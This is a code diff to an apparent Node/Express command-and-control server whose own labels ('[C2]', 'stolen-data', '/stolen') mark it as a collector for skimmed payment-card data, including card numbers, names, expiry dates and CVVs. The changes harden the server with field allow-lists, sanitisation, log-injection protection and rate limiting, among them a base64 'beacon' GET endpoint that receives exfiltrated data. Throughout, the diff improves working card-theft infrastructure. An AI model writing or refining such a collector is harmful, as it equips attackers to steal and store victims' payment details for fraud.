@@ -32,6 +32,27 @@ const apiLimiter = rateLimit({
 })
 const DATA_DIR = path.join(__dirname, 'stolen-data')
 
+// Allowed fields and max lengths for input validation
+const ALLOWED_FIELDS = ['card_number', 'card_name', 'expiry', 'cvv', 'source']
+const MAX_FIELD_LENGTH = 256
+
+// Sanitize a string: strip control characters, limit length
+function sanitizeField(value) {
+  if (value === undefined || value === null) return undefined
+  return String(value).replace(/[\x00-\x1f\x7f]/g, '').slice(0, MAX_FIELD_LENGTH)
+}
+
+// Sanitize request body: only keep allowed fields, sanitize values
+function sanitizeBody(raw) {
+  const clean = {}
+  for (const key of ALLOWED_FIELDS) {
+    if (raw[key] !== undefined) {
+      clean[key] = sanitizeField(raw[key])
+    }
+  }
+  return clean
+}
+
 // Middleware
 app.use(cors())
 app.use(express.json())
@@ -48,14 +69,18 @@ async function ensureDataDir() {
 app.post('/collect', collectLimiter, async (req, res) => {
   await ensureDataDir()
   const ts = new Date().toISOString()
-  const body = req.body || {}
+  const rawBody = req.body || {}
 
-  // Sanitize user input for safe logging (prevent log injection)
+  // Sanitize input: only allowed fields, stripped of control chars
+  const body = sanitizeBody(rawBody)
+
+  // Safe logging (prevent log injection)
+  const safeCardNumber = String(body.card_number || 'N/A').replace(/[\r\n]/g, ' ')
   const safeName = String(body.card_name || 'N/A').replace(/[\r\n]/g, ' ')
   const safeSource = String(body.source || 'unknown').replace(/[\r\n]/g, ' ')
 
   console.log(`\n[C2] 🎯 Stolen data received at ${ts}`)
-  console.log(`[C2]   Card: ${body.card_number || 'N/A'}`)
+  console.log(`[C2]   Card: ${safeCardNumber}`)
   console.log(`[C2]   Name: ${safeName}`)
   console.log(`[C2]   Source: ${safeSource}`)
 
@@ -63,11 +88,11 @@ app.post('/collect', collectLimiter, async (req, res) => {
     id: `stego-${Date.now()}`,
     timestamp: ts,
     ip: req.ip || req.connection.remoteAddress,
-    userAgent: req.get('user-agent'),
-    data: body
+    userAgent: sanitizeField(req.get('user-agent')),
+    data: body  // sanitized body only
   }
 
-  // Save individual file
+  // Save individual file (sanitized data only)
   const filename = `${record.id}.json`
   await fs.writeFile(
     path.join(DATA_DIR, filename),
@@ -94,10 +119,12 @@ app.get('/collect', collectLimiter, async (req, res) => {
       await ensureDataDir()
       const decoded = Buffer.from(req.query.d, 'base64').toString('utf8')
       const parsed = JSON.parse(decoded)
+      // Sanitize decoded data before writing to disk
+      const sanitizedData = sanitizeBody(parsed)
       const record = {
         id: `beacon-${Date.now()}`,
         timestamp: new Date().toISOString(),
-        data: parsed
+        data: sanitizedData
       }
       await fs.writeFile(
         path.join(DATA_DIR, `${record.id}.json`),
@@ -146,7 +173,7 @@ app.get('/stolen', apiLimiter, async (req, res) => {
 })
 
 // Alias
-app.get('/dashboard', async (req, res) => {
+app.get('/dashboard', apiLimiter, async (req, res) => {
   try {
     const html = await fs.readFile(path.join(__dirname, 'dashboard.html'), 'utf8')
     res.send(html)
